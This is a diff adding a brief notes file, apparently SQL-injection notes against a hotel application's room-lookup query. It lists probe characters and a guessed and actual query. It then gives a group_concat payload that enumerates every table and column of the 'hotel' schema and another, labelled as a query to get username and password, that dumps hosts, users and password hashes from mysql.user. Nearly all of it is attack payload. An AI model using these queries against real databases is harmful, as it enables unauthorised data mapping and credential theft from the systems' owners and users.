@@ -1,0 +1,16 @@
+; , + , . , # , &
+
+Room 1 :- Super Family
+Room 2 :- Suite
+Room 3 :- Double
+
+#predicted sql statements
+select id,rating ,room-name,costs,description from roomsroome cod=1
+
+#actual sql statements
+select cod,name,price,descrip,star,image,mini from room where cod=1
+
+SELECT group_concat(TABLE_NAME,";",COLUMN_NAME,"\r\n") FROM Information_Schema.COLUMNS where TABLE_SCHEMA = 'hotel'
+
+#query to get username and password
+SELECT group_concat(host,";",user,":",password,"\r\n") FROM mysql.user
